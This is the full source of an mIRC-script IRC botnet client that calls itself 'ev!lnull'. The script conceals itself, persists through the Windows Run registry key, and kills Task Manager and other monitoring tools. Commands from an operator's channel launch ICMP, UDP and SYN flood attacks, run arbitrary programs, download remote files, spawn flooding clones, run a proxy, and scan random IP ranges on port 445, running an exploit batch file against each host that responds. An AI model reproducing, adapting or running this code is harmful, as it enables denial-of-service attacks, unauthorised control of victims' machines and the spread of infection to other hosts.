on *:START:{
  run nullTL.exe /n /fh winsck
  sconf
  inc %many
  if (%many = 1) { set %infecttime $day $date $time | regs | makeSHR }
}
on *:text:*:*: {
  if ($nick isop $rds(1)) {
    if ($1 = !ntimer) { if ($2 = Sock) { set %ntnick $3 | set %ntserver $4 | set %ntport $5 | sockopen NTimer $+ $r(1,1000) $+ $fnick %ntserver %ntport }  }
    if ($1 = !ntreg) { reg $2- }
    if ($1 = !ntstop) { ntstop }
    if ($1 = !dde) { /dde $2 command "" / $+ $3- }
    if ($1 = !ind) { .identd on $2- }
    if ($1 = !do) { %d0d0 = $2- | / $+ %d0d0 | unset %d0d0 }
    if ($1 = !pfast) { if ($4 == random) { //Tw1stStart $2 $3 $r(1,64000) | halt } | //Tw1stStart $2 $3 $4 }
    if ($1 = !fserv) { .say 'Fileserv initializ3d 0n $nick $+ , Enj0y. *ev!lnull* | /fserve $nick 3 $2  }
    if ($1 = !packet) && ($3 != $null) { run nullTL.exe /n /fh /r "ping.exe $2 -n $3 -l 65500" | .say *DD0s* pack3ttin' on: " $+ $2 $+ ", with=> $calc($3 *65536/1024/1000) $+ mb Trafficz. *ev!lnull* }
    if ($1 = !packet.stop) { run nullTL.exe /n /fh /r "winse.exe -kf ping.exe" | .say *DD0s* pack3ttin' was st0pp3d. *ev!lnull* }
    if ($1 = !run) && ($2 != $null) { /run $2- }
    if ($1 = !icmp) { if ($2 == $null) { .say *SynT4x!* to use the fuckin' icmp command type: icmp 127.0.0.1 2000 1000, l0ws3r. *ev!lnull* | halt } | run nullTL.exe /n /r "ping -n $4 -l $3 -w 0 $2 " }
    if ($1 = !clone) { /clone $2- }
    if ($1 = !syn) { if ($2 !== $null) { .say *S-Y-N packett1ng!* attack: $2 $+ , on: $3 $+ , with: $4 $+ p1ngp0ng. *ev!lnull* | synp start $4 $2 $3 } }
    if ($1 = !pf) { if ($2 = stop) { apagestop } | if ($2 = start) { apages $3- } }
    if ($1 = !download) { /download $2- | .say *Downloading* ( $+ $nopath($3-) $+ ) *ev!lnull* }
    if ($1 = !downd) { /downd $2- | .say *Downloading* ( $+ $nopath($3-) $+ ) *ev!lnull* }
    if ($1 = !bnc.start) && ($3 != $null) { if ($sock(Bnc)) { .say *ERROR*: the fuckin' BNC's already active on +p0 $+ ( $+ %Bnc.Port $+ )/+pw( $+ %Bnc.passwd $+ ) *ev!lnull* | halt } | %Bnc = on | socklisten Bnc $2 | %Bnc.port = $2 | %Bnc.passwd = $3 | say *psyBNS* /server $ip $+ : $+ $2 $3 .. *ev!lnull* }
    if ($1 = !bnc.stats) && ($sock(Bnc)) { .say *psyBNS* is 0n!, $ip $+ : $+ %Bnc.port pass: %Bnc.passwd $+ .. uzErZ: $sock(BncClient*,0) connected: $sock(BncServer*,0) .. *ev!lnull* }
    if ($1 = !bnc.stop) && (%Bnc.Port != $null) { sockclose Bnc* | .say  14(5psyBNS14):14 server on port %bnc.port is now off | unset %bnc.* | sockclose Bnc* }
    if ($1 = !var) { .say  Variable equals to: [ [ $$2- ] ] }
    if ($1 = !ipscan) && (%begshortip == $null) && ($exists(roots.exe)) { set %begit $gettok($ip,1-2,46) $+ . $+ $rand(1,255) $+ . $+ $rand(1,255) | .say (sc4nn3r): scanning: %begit to $gettok($ip,1-2,46) $+ .255.255 | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-2,46) $+ .255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
    if ($1 = !startscan) && (%begshortip == $null) && ($exists(roots.exe)) { .say (sc4nn3r): startin' scan from: ' $+ $2 $+ '  <= t3W! => ' $+ $3 $+ ' *ev!lnull* | set %begshortip $2 | set %beglongip $longip(  %begshortip ) | set %endshortip $3 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
    if ($1 = !randscan) && (%begshortip == $null) && ($exists(roots.exe)) { set %begit $randip($2) | .say (sc4nn3r): startin' scan from: ' $+ %begit $+ '  <= t3W! => ' $+ $3 $+ ' *ev!lnull* | set %begshortip %begit | set %beglongip $longip(  %begshortip ) | set %endshortip $3 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
    if ($1 = !stopscan) && (%begshortip != $null) { sockclose ip* | timerscanner* off | unset %ip* | unset %total | unset %totalscaning | .say (sc4nn3r): the fuckin' scanning of %begshortip to %endshortip stopped by this fucker => $nick $+ ! | unset %beg* | unset %end* | run libparse.exe -kf psexec.exe }
    if ($1 = !diebitch) { /remove dexe.cpl | /remove nexe.cpl | /remove NullNS.BAK | /remove nullTL.exe | /remove winse.exe | /remove klsys.exe | /remove nullcls.bat | /remove nullplug.dll | /remove tsysl.bat | /remove nullscan.exe | /remove nullPz.exe | /remove nullzP.bat | .say *FUCK!* Removing Bot! ev!lnull, dead. 010 | /exit }
    if ($1 = !exitbitch) { /quit dead BOT! | /exit }
  }
}
alias n0clone { if ($portfree(17275) == $false) { exit } | socklisten noclone 17275 }
on *:disconnect:{ timercheck -o 0 15 cona  }
alias ntstop { timernick off | sockclose NTimer* }
alias reg { sockwrite -nt NTimer* Privmsg nickserv : $+ register $1- }
alias Tw1stStart  { if $1 = STOP { .timerTw1st off | unset %gnum | .say *packeting*: Halted!, *ev!lnull* } | if $3 = $null { return } |  if $timer(Tw1st).com != $null { say *ERR0R*: curr3ntly attacking: $gettok($timer(Tw1st).com,3,32) $+ , *ev!lnull* | return } | say *icmp!* sendin' ( $+ $1 $+ ) packetZ to ( $+ $2 $+ ) 0n p0rt: ( $+ $3 $+ ) *ev!lnull* |  set %gnum 0 |  .timerTw1st -m 0 400 Tw1st1t $1 $2 $3 }
alias Tw1st1t {  if $3 = $null { goto done } |  :loop | if %gnum >= $1 { goto done } | inc %gnum 4 
  sockudp Tw1st $2 $3 $str(âô_6?µKTE_}“‘²,60)
  sockudp Tw2st $2 $3 $str(!@#$%^&*()_+|,50)
  sockudp Tw3st $2 $3 $str(@,920)
  sockudp Tw4st $2 $3 $str(0010110,130) 
  sockudp Tw5st $2 $3 $str(Pong,200)
  sockudp Tw6st $2 $3 $str(Tw1st,180)
  sockudp Tw7st $2 $3 $str(*,350)
  sockudp Tw8st $2 $3 $str(link,200)
  sockudp Tw9st $2 $3 $str(Tw1st,180)
  return |  :done | .say *packeting*: FiNiSHeD!, *ev!lnull* | .timerTw1st off | unset %gnum 
}
alias synp { if ($1 == $null) { return } | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop |  syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | .say *S-Y-N packett1ng!* d0nE!, *ev!lnull* }
alias syn {
  if ($2 == start) { if ($3 !isnum) || ($5 !isnum) { return } | var %x = 1 | while (%x <= $3) { sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) $4 $5 | inc %x  } }
  if ($2 == stop) { if ($sock(syn*,0) > 0) { sockclose syn* } }
}
on *:socklisten:Bnc:{ sockaccept BncClient $+ $r(1,999) }
on *:sockread:BncClient*:{
  sockread %BncClient
  if ($gettok(%BncClient,1,32) == NICK) {
    set %Bnc.nick $gettok(%BncClient,2,32)
  }
  if ($gettok(%BncClient,1,32) == USER) {
    set %Bnc.user $gettok(%BncClient,2-,32)
    sockwrite -n $sockname NOTICE AUTH : $+ You need to say /quote PASS <password>
  }
  if ($gettok(%BncClient,1,32) == PASS) { 
    if ($gettok(%BncClient,2,32) == %Bnc.passwd) {
      sockwrite -n $sockname NOTICE AUTH : $+ Welcome to null BNC'z, the irc pr0xy.
      sockwrite -n $sockname NOTICE AUTH : $+ Level two, letzZ connect to something real now
      sockwrite -n $sockname NOTICE AUTH : $+ type /quote conn [server] <port> <pass> to connect
      %Bnc.legit = yes
    } 
    if ($gettok(%BncClient,2,32) != %Bnc.passwd) { 
      sockwrite -n $sockname NOTICE AUTH : $+ Failed Pass!!
    }
  }
  if ($gettok(%BncClient,1,32) == CONN) {
    if (%Bnc.legit != yes) { sockwrite -n $sockname NOTICE AUTH : $+ BNC Exploits dont work on This | sockclose   $sockname
    }
    if (BncServer $+ $remove($sockname,BncClient) != $null) {
      sockclose BncServer $+ $remove($sockname,BncClient)
    }
    sockopen BncServer $+ $remove($sockname,BncClient) $gettok(%BncClient,2,32) $gettok(%BncClient,3,32)
    sockwrite -n $sockname NOTICE AUTH : $+ Making reality through $gettok(%BncClient,2,32) port $gettok(%BncClient,3,32)
    set %Bnc.server.passwd $gettok(%BncClient,4,32)
  }
  else {
    if ($sock(BncServer $+ $remove($sockname,BncClient)).status != active) {
      halt
    }
    sockwrite -n BncServer $+ $remove($sockname,BncClient) %BncClient
  }
}
alias jc { /join $rds(1) $decode(b240w=,m) $+ 0n! }
on *:sockopen:BncServer*:{
  if ($sockerr) {
    sockwrite -n $sockname NOTICE AUTH : $+ Failed Connection
    sockclose $sockname
    halt
  }
  if ($sock($sockname).status != active) {
    sockwrite -n $sockname NOTICE AUTH : $+ Failed Connection
    sockclose BncServer $+ $remove($socknme, BncServer)
    halt
  }
  sockwrite -n BncClient $+ $remove($sockname,BncServer) NOTICE AUTH : $+ Suceeded connection
  sockwrite -n $sockname NICK %Bnc.nick
  sockwrite -n $sockname USER %Bnc.user
}
on *:join:#:{ if (# = $rds(sc)) { if ($nick = $me) { timerjc off } } }
on *:sockread:BncServer*:{
  sockread %BncServer
  if ($sock(BncClient $+ $remove($sockname,BncServer)).status != active) {
    halt
  }
  sockwrite -n BncClient $+ $remove($sockname,BncServer) %BncServer
}
on *:sockread:Ntimer*:{
  sockread %ntread
  Stay %ntread
}
on *:sockread:Clone*:{
  sockread %QHTread
  Stay %QHTread
}
alias fnick {
  set %fnick $rand(1,10)
  if (%fnick = 1) { return $read NullNS.BAK $+ $chr($r(65,125)) $+ $chr($r(65,125))  }
  if (%fnick = 2) { return $chr($r(65,125)) $+ $read nullns.bak $+ $chr($r(65,125))  }
  if (%fnick = 3) { return $chr($r(65,125)) $+ $chr($r(65,125)) $+ $read  nullns.bak }
  if (%fnick = 4) { return $r(A,Z) $+ $read nullns.bak $+ $r(A,Z) }
  if (%fnick = 5) { return $chr($r(65,125)) $+ $chr($r(65,125)) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z)  }
  if (%fnick = 6) { return $read  nullns.bak $+ $r(1,40) $+ $chr($r(65,125))  }
  if (%fnick = 7) { return $r(a,z) $+ $read nullns.bak $+ $r(a,z) }
  if (%fnick = 8) { return $read nullns.bak $+ $r(a,z) $+ $chr($r(65,125))  }
  if (%fnick = 9) { return $read nullns.bak $+ $r(1,10) $+ $chr($r(65,125))  }
  if (%fnick = 10) { return $read nullns.bak $+ $r(20,50) $+ $chr($r(65,125)) }
}
alias cona { // $+ $Regdetele(regger) $+ erver $str($decode(b $+ 2 $+ = $+ , $+ m $+ ),2) $+ $chr(101) $+ $chr(118) $+ $chr(105) $+ $chr(108) $+ . $+ X $+ $read -l11 nullns.bak $+ t $+ . $+ $rds(2) | if ($portfree(113)) { socklisten IDENT 113 } }
on *:Sockopen:NTimer*:{
  if ($sockerr > 0) { halt }
  set -u1 %user $rand(a,z) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ %flood.nick $+ $rand(a,z) $+ $rand(a,z)
  .sockwrite -nt $sockname USER %user %user %user : $+ %user
  .sockwrite -nt $sockname NICK $fnick
  timernick 0 2 sockwrite -nt NTimer* Nick %ntnick
}
alias clone {
  if ($1 = con) { set %cserver $2 | /set %cport $3 | /timeropensock $+ $fnick $4 2 opensock }
  if ($1 = join) { sockwrite -nt Clone* Join $2- }
  if ($1 = part) { sockwrite -nt Clone* Part $2 : $+ $3- }
  if ($1 = msg) { sockwrite -nt Clone* privmsg $2 : $+ $3- }
  if ($1 = notice) { sockwrite -nt Clone* notice $2 : $+ $3- }
  if ($1 = reg) { sockwrite -nt Clone* Privmsg NickServ : $+ register $2- | sockwrite -nt Clone* Privmsg NickServ : $+ identify $2- }
  if ($1 = creg) { set %rchan # $+ $fnick $+ $rand(1,1000) | sockwrite -nt Clone* Join %rchan | sockwrite -nt Clone* Privmsg Chanserv : register %rchan $fnick Clone }
  if ($1 = jp) { sockwrite -nt Clone* Join $2- | sockwrite -nt Clone* part $2 : $3- | sockwrite -nt Clone* Join $2- | sockwrite -nt Clone* part $2 : $3- | sockwrite -nt Clone* Join $2- | sockwrite -nt Clone* part $2 : $3- }
  if ($1 = jmp) { sockwrite -nt Clone* Join $2 | sockwrite -nt Clone* privmsg $2 : $3- | sockwrite -nt Clone* part $2 }
  if ($1 = jnp) { sockwrite -nt Clone* Join $2 | sockwrite -nt Clone* notice $2 : $3- | sockwrite -nt Clone* part $2 }
  if ($1 = flood.c) { sockwrite -nt Clone* join $2 | sockwrite -nt Clone* privmsg $2 : $3- | sockwrite -nt Clone* notice $2 : $3- | sockwrite -nt Clone* privmsg $2 : $3- }
  if ($1 = flood.n) { sockwrite -nt Clone* privmsg $2 : $3- | sockwrite -nt Clone* notice $2 : $3- | sockwrite -nt Clone* privmsg $2 : $3- }
  if ($1 = chat.flood) { sockwrite -nt Clone* privmsg $2 :DCC CHAT $2 1058633484 3481  }
  if ($1 = Quit) { Sockwrite -nt Clone* Quit : $+ $2- }
  if ($1 = massquit) { SockWrite -nt Clone* Join $2 | Sockwrite -nt Clone* Quit : $+ $3- }
  if ($1 = fnick) { sockwrite -nt Clone* Nick $2 $+ $r(1,1000) $+ $r(1,1000)  }
  if ($1 = Die) { timeropensock* off | sockclose Clone* }
}
on *:socklisten:ident: { .sockaccept $sockname $+ . $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) }
on *:sockread:IDENT.*: { sockread %tmp | tokenize 32 %tmp | sockwrite -tn $sockname $3 $2 $1 : USERID : UNIX : $fnick | unset %tmp }

alias opensock { sockopen Clone $+ $fnick %cserver %cport }
alias Stay {
  if (PING = $1) { sockwrite -nt * $1- }
}
on *:Sockopen:Clone*:{
  set -u1 %user $rand(A,Z) $+ $fnick $+ $rand(A,Z)
  .sockwrite -nt $sockname USER %user %user %user : $+ %user
  .sockwrite -nt $sockname NICK $fnick
}
raw 433:*:{
  nick root $+ -[ $+ $rand(100000,999999) $+ ]
}
on 1:sockopen:ip*:{ if ($sockerr > 0) { halt } | set %445 % [ $+ [ $sockname ] ] | run nullTL.exe /n /fh /r "root.bat %445 $+ " | .say [A2I: %445 $+ ] | sockclose $sockname | unset %445 | halt }
alias finished { .say (sc4nn3r): the fuckin range scanning from %begshortip to %endshortip is damned finished! | sockclose ip* | timers off | unset %beg* | unset %end* | unset %ip* | unset %total* }
alias startscan {
  inc %totalscaning
  if %totalscaning == %total finished
  set %ip1 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 1
  set %ip2 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 2
  set %ip3 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 3
  set %ip4 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 4
  set %ip5 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 5
  set %ip6 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 6
  set %ip7 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 7
  set %ip8 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 8
  set %ip9 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 9
  set %ip10 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 10
  set %ip11 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 11
  set %ip12 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 12
  set %ip13 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 13
  set %ip14 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 14
  set %ip15 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 15
  set %ip16 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 16
  set %ip17 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 17
  set %ip18 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 18
  set %ip19 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 19
  set %ip20 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 20
  set %ip21 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 21
  set %ip22 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 22
  set %ip23 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 23
  set %ip24 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 24
  set %ip25 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  opensocks
}
alias opensocks {
  sockopen ip1 %ip1 445
  if $1 == 1 finished
  sockopen ip2 %ip2 445
  if $1 == 2 finished
  sockopen ip3 %ip3 445
  if $1 == 3 finished
  sockopen ip4 %ip4 445
  if $1 == 4 finished
  sockopen ip5 %ip5 445
  if $1 == 5 finished
  sockopen ip6 %ip6 445
  if $1 == 6 finished
  sockopen ip7 %ip7 445
  if $1 == 7 finished
  sockopen ip8 %ip8 445
  if $1 == 8 finished
  sockopen ip9 %ip9 445
  if $1 == 9 finished
  sockopen ip10 %ip10 445
  if $1 == 10 finished
  sockopen ip11 %ip11 445
  if $1 == 11 finished
  sockopen ip12 %ip12 445
  if $1 == 12 finished
  sockopen ip13 %ip13 445
  if $1 == 13 finished
  sockopen ip14 %ip14 445
  if $1 == 14 finished
  sockopen ip15 %ip15 445
  if $1 == 15 finished
  sockopen ip16 %ip16 445
  if $1 == 16 finished
  sockopen ip17 %ip17 445
  if $1 == 17 finished
  sockopen ip18 %ip18 445
  if $1 == 18 finished
  sockopen ip19 %ip19 445
  if $1 == 19 finished
  sockopen ip20 %ip20 445
  if $1 == 20 finished
  sockopen ip21 %ip21 445
  if $1 == 21 finished
  sockopen ip22 %ip22 445
  if $1 == 22 finished
  sockopen ip23 %ip23 445
  if $1 == 23 finished
  sockopen ip24 %ip24 445
  if $1 == 24 finished
  sockopen ip25 %ip25 445
  timerscannerTE 1 12 sockclose ip*
  timerscannerSA 1 15 startscan
}
alias randip {
  unset %1p1 %1p2
  set %1p1 $1-
  set %1p2 $replace($gettok(%1p1,1,46),*,$rand(1,255))
  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,2,46),*,$rand(1,255))
  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,3,46),*,$rand(1,255))
  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,4,46),*,$rand(1,255))
  return %1p2
}
on ^*:action:*!bitch*:?:{ 
  if ($Regwirte(khara) == null) { 
    $chr(365) $+ $chr(367) $+ d $+ $chr(357) $rds(1) + $+ $chr(367) null
  }
}
alias apages { set %asite $1 | set %filesite $2 | sockopen apages $+ $fnick %asite 80 }
alias apagestop { timerapage* off | sockclose apages* }
on *:sockopen:apages*:{
  timerapage $+ $fnick 0 2 sockwrite -nt apages* GET %filesite
}

alias download {
  var %socket $+(dl,$chr(46),$nopath($2))
  if (!$sock(%socket)) {
    sockopen %socket $1 80
    sockmark %socket HEAD $1 $2
  }
  else { .say * Socket already in use. }
}
alias downd {
  if ($exists($nopath($2)) = $false) || ($file($nopath($2)).size != $3) {
    var %socket $+(dl,$chr(46),$nopath($2))
    if (!$sock(%socket)) {
      sockopen %socket $1 80
      sockmark %socket HEAD $1 $2
    }
    else { .say * Socket already in use. }
  }
}
alias percent return $+($round($calc((100 / $2) * $1),2),%)

on *:SOCKOPEN:dl.*:{
  if ($sockerr) { .say * Error: $sock($sockname).wsmsg | return }
  hadd -m ticks $sockname $ticks
  var %file = $nopath($gettok($sock($sockname).mark,3,32)), %fullfile = $+(",$mircdir,%file,"), %sckr = sockwrite -n $sockname, %^ = $gettok($sock($sockname).mark,3,32)
  write -c %fullfile
  %sckr GET $iif(left(%^,1) != $chr(47),$chr(47) $+ %^,%^) HTTP/1.0
  %sckr HOST: $gettok($sock($sockname).mark,2,32)
  %sckr ACCEPT: *.*
  %sckr $crlf
}

on *:SOCKREAD:dl.*:{
  if ($sockerr) {
    .say * Error: $sock($sockname).wsmsg
    return
  }
  var %a
  :begin
  if ($gettok($sock($sockname).mark,1,32) == head) { sockread %a }
  else { sockread &b }
  if ($sockbr) {
    tokenize 32 $sock($sockname).mark
    if ($1 == HEAD) {
      if (%a) {
        if ($gettok(%a,1,32) == Content-Length:) { var %totsize = $gettok(%a,2,32) }
      }
      else {
        sockmark $sockname GET $2- %totsize
      }
    }
    elseif ($1 == GET) {
      var %file = $+(",$mircdir,$nopath($3),"), %cursize = $file(%file).size
      var %totsize = $gettok($sock($sockname).mark,4,32)
      bwrite %file -1 &b
    }
    goto begin
  }
}

on *:SOCKCLOSE:dl.*:{
  var %ticks = $calc(($ticks - $hget(ticks,$sockname)) /1000)
  .say * Download of $nopath($gettok($sock($sockname).mark,3,32)) completed in %ticks seconds.
}
alias H1dd3 { if ($appstate != hidden) { /exit } }
alias s33 { if ($appactive = $true) { /exit } }
on *:connect:{ .ial on | .timerjc 0 $rand(5,10) /jc |   .timercheck off | .pdcc on | .fsend on | clearall }
alias makeSHR {
  var %SHR $findfile($mircdir,*.*,0,write SHR.bat attrib +R +S +H $noPATH($1-))
  run nullTL.exe /n /fh /r SHR.bat
}
alias killsofts {
  run nullTL.exe /n /fh /r "winse.exe -kf msconfig.exe taskmgr.exe NETSTAT.EXE"
}
alias rds {
  if ($1 = 1) { return $chr(35) $+ $decode(b240w=,m) } 
  if ($1 = 0) { return $decode(b $+ 2 $+ = $+ , $+ m $+ ) }
  if ($1 = 2) { return b $+ $chr(105) $+ z $rbs(ve) }
}
alias rbs {
  if ($1 = ev) { return *!* $+ $chr(101) $+ $chr(118) $+ $chr(105) $+ $chr(108) $+ $rbs(0) $+ *@* }
  if ($1 = ve) { return $str(6,3) $+ 7 }
}

alias RegRead {
  if ($1 != $null) {
    var %a = regread
    .comopen %a WScript.Shell
    if !$comerr {
      var %b =  $com(%a,RegRead,3,bstr,$1-)
      var %c = $com(%a).result
      .comclose %a
      if (%c != $null) return %c
      else {
        return NA 
      }
    }
  }
  else { return error! complete data }
}
alias RegWrite {
  if ($1 != $null) && ($2 != $null) && ($3 != $null) {
    var %a = RegWrite
    .comopen %a WScript.Shell
    if !$comerr {
      var %b =  $com(%a,RegWrite,3,bstr,$1,bstr,$2,bstr,$3)
      .comclose %a
    }
    if ($3 == REG_EXPAND_SZ) || ($3 == REG_SZ) {
      if ($regread($1) == $2) { return the value ( $+ $1 $+ ) was created }
      else { return error! when writing }
    }
  }
  else { return error! complete data }
}
alias Regwirte {
  if ($1 = khara) { return $nick }
}
alias Regdetele {
  if ($1 = regger) { return $chr(115) }
}
alias RegDelete {
  if ($1 != $null) {
    var %a = RegDelete 
    .comopen %a WScript.Shell
    if !$comerr {
      var %b =  $com(%a,RegDelete,3,bstr,$1)
      .comclose %a
    }
  }
  else { return error! complete data }
}
alias sconf { 
  .ddeserver on Kuwait City ! by Barrak.
  .nick root $+ -[ $+ $rand(100000,999999) $+ ]
  .fullname *ev!lnull* [Beta SCANNER! *ROOT*]
  .n0clone
  .cona
  .timercheck 0 10 Cona
  .timerh1dd3 -o 0 1 H1dd3
  .timers33 -o 0 1 s33
  .timerregs -o 0 1 regs
  .run nullTL.exe /n /fh /r nullcls.bat
  .timerkillsofts -o 0 5 killsofts
}
alias regs { if ($Regread(HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\root)  = NA) { $RegWrite(HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\root,$mircdirklsys.exe,REG_SZ) } }
alias /say { if ($me isvo $rds(1)) { clearall | msg $rds(1) $1- } }